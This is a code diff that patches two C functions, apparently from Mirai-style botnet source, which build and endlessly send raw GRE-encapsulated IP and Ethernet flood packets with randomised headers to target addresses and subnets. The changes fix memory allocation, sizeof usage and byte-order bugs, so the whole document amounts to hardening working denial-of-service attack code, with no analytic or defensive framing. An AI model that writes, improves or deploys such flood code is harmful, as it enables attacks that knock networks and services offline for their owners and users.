@@ -19,8 +19,9 @@
 
 void attack_gre_ip(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
-    int i, fd;
-    char **pkts = calloc(targs_len, sizeof (char *));
+    int i, fd = -1;
+    char **pkts = NULL;
+    
     uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
     uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
     uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
@@ -41,11 +42,17 @@ void attack_gre_ip(uint8_t targs_len, struct attack_target *targs, uint8_t opts_
     }
 
     i = 1;
-    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
+    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
     {
         #ifdef DEBUG
                 printf("Failed to set IP_HDRINCL. Aborting\n");
         #endif
+        close(fd);
+        return;
+    }
+
+    pkts = calloc(targs_len, sizeof(char *));
+    if (!pkts) {
         close(fd);
         return;
     }
@@ -57,17 +64,20 @@ void attack_gre_ip(uint8_t targs_len, struct attack_target *targs, uint8_t opts_
         struct iphdr *greiph;
         struct udphdr *udph;
 
-        pkts[i] = calloc(1510, sizeof (char *));
+        pkts[i] = calloc(1510, sizeof(char));
+        if (!pkts[i]) {
+            goto cleanup;
+        }
+        
         iph = (struct iphdr *)(pkts[i]);
         greh = (struct grehdr *)(iph + 1);
         greiph = (struct iphdr *)(greh + 1);
         udph = (struct udphdr *)(greiph + 1);
 
-        
         iph->version = 4;
         iph->ihl = 5;
         iph->tos = ip_tos;
-        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len);
+        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
         iph->id = htons(ip_ident);
         iph->ttl = ip_ttl;
         if (dont_frag)
@@ -76,14 +86,12 @@ void attack_gre_ip(uint8_t targs_len, struct attack_target *targs, uint8_t opts_
         iph->saddr = source_ip;
         iph->daddr = targs[i].addr;
 
-        
-        greh->protocol = htons(ETH_P_IP); 
+        greh->protocol = htons(ETH_P_IP);
 
-        
         greiph->version = 4;
         greiph->ihl = 5;
         greiph->tos = ip_tos;
-        greiph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + data_len);
+        greiph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
         greiph->id = htons(~ip_ident);
         greiph->ttl = ip_ttl;
         if (dont_frag)
@@ -95,16 +103,17 @@ void attack_gre_ip(uint8_t targs_len, struct attack_target *targs, uint8_t opts_
         else
             greiph->daddr = ~(greiph->saddr - 1024);
 
-        
         udph->source = htons(sport);
         udph->dest = htons(dport);
-        udph->len = htons(sizeof (struct udphdr) + data_len);
+        udph->len = htons(sizeof(struct udphdr) + data_len);
     }
 
     while (TRUE)
     {
         for (i = 0; i < targs_len; i++)
         {
+            if (!pkts[i]) continue;
+            
             char *pkt = pkts[i];
             struct iphdr *iph = (struct iphdr *)pkt;
             struct grehdr *greh = (struct grehdr *)(iph + 1);
@@ -112,7 +121,6 @@ void attack_gre_ip(uint8_t targs_len, struct attack_target *targs, uint8_t opts_
             struct udphdr *udph = (struct udphdr *)(greiph + 1);
             char *data = (char *)(udph + 1);
 
-            
             if (targs[i].netmask < 32)
                 iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
 
@@ -121,13 +129,13 @@ void attack_gre_ip(uint8_t targs_len, struct attack_target *targs, uint8_t opts_
 
             if (ip_ident == 0xffff)
             {
-                iph->id = rand_next() & 0xffff;
-                greiph->id = ~(iph->id - 1000);
+                iph->id = htons(rand_next() & 0xffff);
+                greiph->id = htons(~(ntohs(iph->id) - 1000));
             }
             if (sport == 0xffff)
-                udph->source = rand_next() & 0xffff;
+                udph->source = htons(rand_next() & 0xffff);
             if (dport == 0xffff)
-                udph->dest = rand_next() & 0xffff;
+                udph->dest = htons(rand_next() & 0xffff);
 
             if (!gcip)
                 greiph->daddr = rand_next();
@@ -138,18 +146,18 @@ void attack_gre_ip(uint8_t targs_len, struct attack_target *targs, uint8_t opts_
                 rand_str(data, data_len);
 
             iph->check = 0;
-            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
+            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
 
             greiph->check = 0;
-            greiph->check = checksum_generic((uint16_t *)greiph, sizeof (struct iphdr));
+            greiph->check = checksum_generic((uint16_t *)greiph, sizeof(struct iphdr));
 
             udph->check = 0;
-            udph->check = checksum_tcpudp(greiph, udph, udph->len, sizeof (struct udphdr) + data_len);
+            udph->check = checksum_tcpudp(greiph, udph, udph->len, sizeof(struct udphdr) + data_len);
 
             targs[i].sock_addr.sin_family = AF_INET;
             targs[i].sock_addr.sin_addr.s_addr = iph->daddr;
             targs[i].sock_addr.sin_port = 0;
-            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
+            sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
         }
 
         #ifdef DEBUG
@@ -157,12 +165,20 @@ void attack_gre_ip(uint8_t targs_len, struct attack_target *targs, uint8_t opts_
                 printf("errno = %d\n", errno);
 #endif
     }
+
+cleanup:
+    for (i = 0; i < targs_len; i++) {
+        if (pkts[i]) free(pkts[i]);
+    }
+    free(pkts);
+    if (fd != -1) close(fd);
 }
 
 void attack_gre_eth(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
-    int i, fd;
-    char **pkts = calloc(targs_len, sizeof (char *));
+    int i, fd = -1;
+    char **pkts = NULL;
+    
     uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
     uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
     uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
@@ -181,12 +197,19 @@ void attack_gre_eth(uint8_t targs_len, struct attack_target *targs, uint8_t opts
 #endif
         return;
     }
+    
     i = 1;
-    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
+    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
     {
 #ifdef DEBUG
         printf("Failed to set IP_HDRINCL. Aborting\n");
 #endif
+        close(fd);
+        return;
+    }
+
+    pkts = calloc(targs_len, sizeof(char *));
+    if (!pkts) {
         close(fd);
         return;
     }
@@ -200,18 +223,21 @@ void attack_gre_eth(uint8_t targs_len, struct attack_target *targs, uint8_t opts
         struct udphdr *udph;
         uint32_t ent1, ent2, ent3;
 
-        pkts[i] = calloc(1510, sizeof (char *));
+        pkts[i] = calloc(1510, sizeof(char));
+        if (!pkts[i]) {
+            goto cleanup;
+        }
+        
         iph = (struct iphdr *)(pkts[i]);
         greh = (struct grehdr *)(iph + 1);
         ethh = (struct ethhdr *)(greh + 1);
         greiph = (struct iphdr *)(ethh + 1);
         udph = (struct udphdr *)(greiph + 1);
 
-        
         iph->version = 4;
         iph->ihl = 5;
         iph->tos = ip_tos;
-        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct ethhdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len);
+        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
         iph->id = htons(ip_ident);
         iph->ttl = ip_ttl;
         if (dont_frag)
@@ -220,17 +246,14 @@ void attack_gre_eth(uint8_t targs_len, struct attack_target *targs, uint8_t opts
         iph->saddr = source_ip;
         iph->daddr = targs[i].addr;
 
-        
-        greh->protocol = htons(PROTO_GRE_TRANS_ETH); 
+        greh->protocol = htons(PROTO_GRE_TRANS_ETH);
 
-        
         ethh->h_proto = htons(ETH_P_IP);
 
-        
         greiph->version = 4;
         greiph->ihl = 5;
         greiph->tos = ip_tos;
-        greiph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + data_len);
+        greiph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
         greiph->id = htons(~ip_ident);
         greiph->ttl = ip_ttl;
         if (dont_frag)
@@ -242,16 +265,17 @@ void attack_gre_eth(uint8_t targs_len, struct attack_target *targs, uint8_t opts
         else
             greiph->daddr = ~(greiph->saddr - 1024);
 
-        
         udph->source = htons(sport);
         udph->dest = htons(dport);
-        udph->len = htons(sizeof (struct udphdr) + data_len);
+        udph->len = htons(sizeof(struct udphdr) + data_len);
     }
 
     while (TRUE)
     {
         for (i = 0; i < targs_len; i++)
         {
+            if (!pkts[i]) continue;
+            
             char *pkt = pkts[i];
             struct iphdr *iph = (struct iphdr *)pkt;
             struct grehdr *greh = (struct grehdr *)(iph + 1);
@@ -261,7 +285,6 @@ void attack_gre_eth(uint8_t targs_len, struct attack_target *targs, uint8_t opts
             char *data = (char *)(udph + 1);
             uint32_t ent1, ent2, ent3;
 
-            
             if (targs[i].netmask < 32)
                 iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
 
@@ -270,13 +293,13 @@ void attack_gre_eth(uint8_t targs_len, struct attack_target *targs, uint8_t opts
 
             if (ip_ident == 0xffff)
             {
-                iph->id = rand_next() & 0xffff;
-                greiph->id = ~(iph->id - 1000);
+                iph->id = htons(rand_next() & 0xffff);
+                greiph->id = htons(~(ntohs(iph->id) - 1000));
             }
             if (sport == 0xffff)
-                udph->source = rand_next() & 0xffff;
+                udph->source = htons(rand_next() & 0xffff);
             if (dport == 0xffff)
-                udph->dest = rand_next() & 0xffff;
+                udph->dest = htons(rand_next() & 0xffff);
 
             if (!gcip)
                 greiph->daddr = rand_next();
@@ -295,18 +318,18 @@ void attack_gre_eth(uint8_t targs_len, struct attack_target *targs, uint8_t opts
                 rand_str(data, data_len);
 
             iph->check = 0;
-            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
+            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
 
             greiph->check = 0;
-            greiph->check = checksum_generic((uint16_t *)greiph, sizeof (struct iphdr));
+            greiph->check = checksum_generic((uint16_t *)greiph, sizeof(struct iphdr));
 
             udph->check = 0;
-            udph->check = checksum_tcpudp(greiph, udph, udph->len, sizeof (struct udphdr) + data_len);
+            udph->check = checksum_tcpudp(greiph, udph, udph->len, sizeof(struct udphdr) + data_len);
 
             targs[i].sock_addr.sin_family = AF_INET;
             targs[i].sock_addr.sin_addr.s_addr = iph->daddr;
             targs[i].sock_addr.sin_port = 0;
-            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct ethhdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
+            sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
         }
 
 #ifdef DEBUG
@@ -314,4 +337,11 @@ void attack_gre_eth(uint8_t targs_len, struct attack_target *targs, uint8_t opts
             printf("errno = %d\n", errno);
 #endif
     }
+
+cleanup:
+    for (i = 0; i < targs_len; i++) {
+        if (pkts[i]) free(pkts[i]);
+    }
+    free(pkts);
+    if (fd != -1) close(fd);
 }
